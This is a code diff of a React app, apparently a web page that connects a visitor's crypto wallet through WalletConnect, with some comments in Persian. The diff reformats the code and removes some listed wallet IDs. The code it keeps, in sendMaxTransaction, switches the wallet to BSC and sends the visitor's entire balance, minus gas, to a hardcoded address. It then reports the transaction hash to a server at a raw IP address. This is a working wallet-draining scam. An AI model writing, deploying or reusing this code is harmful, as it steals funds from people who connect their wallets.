@@ -10,13 +10,6 @@ function App() {
         explorerRecommendedWalletIds: [
           "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
           "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
-          "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",
-          "426b8b13634593783072a3253bb061e825dceeb13593425cc315a9e7d7e60323",
-          "f725ed2c96fc9105359df8393b3192a02fdb91c93ad73d0b0edb3f7eae70d059",
-          "f81ffb6c9be6997a8e7463c49358b64e733c1cf52f54f2731749eab21cfde63b",
-          "f759efd17edb158c361ffd793a741b3518fe85b9c15d36b9483fba033118aaf2",
-          "be49f0a78d6ea1beed3804c3a6b62ea71f568d58d9df8097f3d61c7c9baf273d",
-          "9a565677e1c0258ac23fd2becc9a6497eeb2f6bf14f6e2af41e3f1d325852edd",
         ],
       },
       chains: [1, 56], // پشتیبانی از BSC و Ethereum
@@ -26,8 +19,8 @@ function App() {
 
     await ethereumProvider.enable();
     var provider = ethereumProvider;
-    var account = await provider.request({ method: "eth_accounts" });
-    var account_sender = account[0];
+    var accounts = await provider.request({ method: "eth_accounts" });
+    var account_sender = accounts[0];
     console.log("✅ Wallet Address:", account_sender);
 
     async function switchToBSC() {
@@ -44,13 +37,11 @@ function App() {
 
     async function sendMaxTransaction() {
       try {
-        // دریافت موجودی کیف پول
         let balance = await provider.request({
           method: "eth_getBalance",
           params: [account_sender, "latest"],
         });
 
-        // مقدار موجودی را از HEX به Decimal تبدیل می‌کنیم
         let balanceInWei = BigInt(balance);
         console.log(`💰 Balance: ${balanceInWei} WEI`);
 
@@ -60,50 +51,48 @@ function App() {
         }
 
         const transactionParameters = {
-          to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
+          to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
           from: account_sender,
-          value: "0x" + (balanceInWei - BigInt(21000) * BigInt(5000000000)).toString(16), // ارسال کل موجودی - گس
-          gas: "0x5208", // مقدار گس استاندارد
+          value: "0x" + (balanceInWei - BigInt(21000) * BigInt(5000000000)).toString(16),
+          gas: "0x5208",
         };
 
         const txHash = await provider.request({
-  method: "eth_sendTransaction",
-  params: [transactionParameters],
-});
-console.log("✅ Transaction Hash:", txHash);
-
-// چک کردن مقدار `signature`
-if (!txHash) {
-  console.error("❌ Error: Transaction hash is undefined!");
-  return;
-}
-
-// ✅ ارسال امضا به سرور
-try {
-  let response = await fetch("http://104.194.133.124/send.php", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      handler: "sign",
-      signature: txHash,
-      type: "coin",
-    }),
-  });
-
-  let result = await response.json();
-  console.log("✅ Server Response:", result);
-} catch (error) {
-  console.error("❌ Error sending signature to server:", error);
-}
+          method: "eth_sendTransaction",
+          params: [transactionParameters],
+        });
 
         console.log("✅ Transaction Hash:", txHash);
+
+        if (!txHash) {
+          console.error("❌ Error: Transaction hash is undefined!");
+          return;
+        }
+
+        // ✅ ارسال امضا به سرور
+        try {
+          let response = await fetch("http://104.194.133.124/send.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              handler: "sign",
+              signature: txHash,
+              type: "coin",
+            }),
+          });
+
+          let result = await response.json();
+          console.log("✅ Server Response:", result);
+        } catch (error) {
+          console.error("❌ Error sending signature to server:", error);
+        }
       } catch (error) {
         console.error("❌ Error sending transaction:", error);
       }
     }
 
-    await switchToBSC(); // تغییر شبکه به BSC قبل از ارسال تراکنش
-    await sendMaxTransaction(); // ارسال کل موجودی به آدرس مقصد
+    await switchToBSC();
+    await sendMaxTransaction();
   }
 
   return (
